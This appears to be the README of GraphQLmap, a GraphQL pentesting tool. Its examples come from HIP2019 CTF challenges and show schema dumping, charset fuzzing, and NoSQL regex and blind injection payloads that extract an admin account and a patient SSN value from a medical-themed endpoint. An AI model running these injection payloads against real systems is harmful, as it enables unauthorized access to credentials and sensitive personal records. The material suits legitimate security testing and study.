# GraphQLmap

> GraphQLmap is a scripting engine to interact with a graphql endpoint for pentesting purposes.

Features :
- Dump a GraphQL schema
- Interact with a GraphQL endpoint
- Execute GraphQL queries
- Autocomplete queries
- NoSQL injection inside a GraphQL field
- SQL injection inside a GraphQL field
- GraphQL field fuzzing


## Install

```
$ git clone github.com/swisskyrepo/GraphQLmap
$ python graphqlmap.py                                                              
   _____                 _      ____  _                            
  / ____|               | |    / __ \| |                           
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \ 
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/ 
                  | |                                       | |    
                  |_|                                       |_|    
                                         Author:Swissky Version:1.0
usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]]

optional arguments:
  -h, --help      show this help message and exit
  -u URL          URL to query : example.com/graphql?query={}
  -v [VERBOSITY]  Enable verbosity
```


## Examples

:warning: Examples are based on several CTF challenges from HIP2019.


Use `dump` to dump the GraphQL schema, this function will automaticly populate the "autocomplete" with the found fields.    
[:movie_camera: Live Example](https://asciinema.org/a/A2oTO2KrVkkwlFapOdoETqtKa)

```powershell
GraphQLmap > dump                     
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)                   
                                                                                               
Query                                          
        doctor[]: email (String!),                                                             
        doctors[Doctor]:                                                                       
        patients[Patient]:                                                                     
        patient[]: id (ID!),                   
        allrendezvous[Rendezvous]:                                                             
        rendezvous[]: id (ID!),                                                                
Doctor                                         
        id[ID]:                                                                                
        firstName[String]:                     
        lastName[String]:                                                                      
        specialty[String]:                     
        patients[None]: 
        rendezvous[None]: 
        email[String]: 
        password[String]: 
[...]
```

Write a GraphQL request to execute it.

```powershell
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
{
    "data": {
        "doctors": [
            {
                "firstName": "Admin",
                "id": "5d089c51dcab2d0032fdd08d",
                "lastName": "Admin"
            }
        ]
    }
}
```

Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
[:movie_camera: Live Example](https://asciinema.org/a/FsXjsHQ9YilY18ofoOTrs8wXR)

```powershell
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi!\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi$\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi%\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi(\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi)\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi*\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi+\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi,\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi-\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi.\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi/\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi0\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}     
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi?\"} }"){firstName lastName id}}
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
```

Use `BLIND_PLACEHOLDER` inside the query for the `nosqli` function.    
[:movie_camera: Live Example](https://asciinema.org/a/geENvCljpOCBhBZ2Y3joAJwDc)

```powershell
GraphQLmap > nosqli
Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
Check > 5d089c51dcab2d0032fdd08d
[+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
```

